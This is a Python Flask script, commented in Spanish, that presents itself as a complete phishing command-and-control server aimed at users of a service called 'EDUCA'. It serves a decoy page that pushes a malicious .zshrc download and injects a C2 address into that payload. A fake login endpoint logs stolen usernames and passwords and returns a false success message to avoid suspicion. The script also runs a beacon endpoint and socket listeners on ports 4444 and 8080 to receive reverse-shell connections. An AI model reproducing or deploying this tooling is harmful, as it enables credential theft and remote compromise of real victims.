# c2_phishing_server.py - Servidor completo para tu phishing
from flask import Flask, request, jsonify
import threading
import socket
import base64
import json
from datetime import datetime

app = Flask(__name__)

# Almacén de credenciales robadas
creds_stolen = []
sessions = []

@app.route('/')
def phishing_page():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>EDUCA - Redirección...</title>
    <meta http-equiv="refresh" content="2;url=/download-zshrc">
    </head>
    <body style="text-align:center;padding:50px;font-family:Arial;">
        <h2>🔒 Verificando credenciales...</h2>
        <p>Redirigiendo a configuración segura (2s)</p>
    </body>
    </html>
    '''

@app.route('/download-zshrc')
def download_payload():
    # ¡Aquí sirves el .zshrc malicioso!
    with open('malicious.zshrc', 'r') as f:
        payload = f.read()
    
    # Reemplaza la IP del C2 dinámicamente
    client_ip = request.remote_addr
    payload = payload.replace('TU_C2_IP_AQUI', client_ip)
    
    return payload, 200, {'Content-Type': 'text/plain', 
                         'Content-Disposition': 'attachment; filename=".zshrc"'}

@app.route('/login', methods=['POST'])
def fake_login():
    global creds_stolen
    
    data = request.json
    usuario = data.get('usuario', '')
    clave = data.get('clave', '')
    
    # LOG CREDENCIALES ROBADAS
    cred_data = {
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'usuario': usuario,
        'clave': clave,
        'target': 'EDUCA Phishing'
    }
    creds_stolen.append(cred_data)
    
    print(f"🎣 CREDENCIALES ROBADAS: {usuario}:{clave} desde {request.remote_addr}")
    
    # Respuesta falsa "exitosa" para no levantar sospechas
    return jsonify({
        'success': True,
        'message': '¡Acceso autorizado! Descargando configuración...',
        'redirect': '/download-zshrc'
    })

@app.route('/beacon')
def beacon():
    data = request.args
    print(f"📡 BEACON: {data}")
    return "OK"

if __name__ == '__main__':
    # También levanta netcat listeners en background
    def nc_listener(port):
        s = socket.socket()
        s.bind(('0.0.0.0', port))
        s.listen(5)
        print(f"[+] NC listener en puerto {port}")
        while True:
            client, addr = s.accept()
            print(f"[+] Conexión NC {addr}:{port}")
            threading.Thread(target=lambda: handle_nc(client), daemon=True).start()
    
    def handle_nc(client):
        while True:
            try:
                data = client.recv(1024).decode()
                print(f"[NC] {data.strip()}")
            except:
                break
        client.close()
    
    # Listeners en background
    threading.Thread(target=nc_listener, args=(4444,), daemon=True).start()
    threading.Thread(target=nc_listener, args=(8080,), daemon=True).start()
    
    print("🚀 C2 PHISHING SERVER corriendo en http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)